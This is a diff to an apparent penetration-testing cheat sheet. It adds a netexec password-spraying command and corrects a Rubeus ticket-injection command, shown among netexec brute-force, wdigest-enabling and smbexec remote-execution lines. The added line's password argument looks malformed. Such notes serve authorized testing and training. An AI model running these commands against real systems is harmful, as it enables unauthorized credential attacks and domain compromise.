@@ -5150,6 +5150,7 @@ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WO
 netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --wdigest enable
 netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'quser'
 netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'net user Administrator /domain' --exec-method smbexec
+netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p '-p /PATH/TO/WORDLIST/<WORDLIST>!' -d DOMAIN --continue-on-success
 ```
 
 #### pypykatz
@@ -6036,7 +6037,7 @@ With Rubeus, first get the ticket.kirbi
 ```
 
 ```c
-.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<DOMAIN> /username:<USERNAME> /password:FakePass /ticket:<BASE^$_TICKET>
+.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<DOMAIN> /username:<USERNAME> /password:FakePass /ticket:<BASE64_TICKET>
 ```
 
 ###### Domain Controller Syncronization (DCSync)
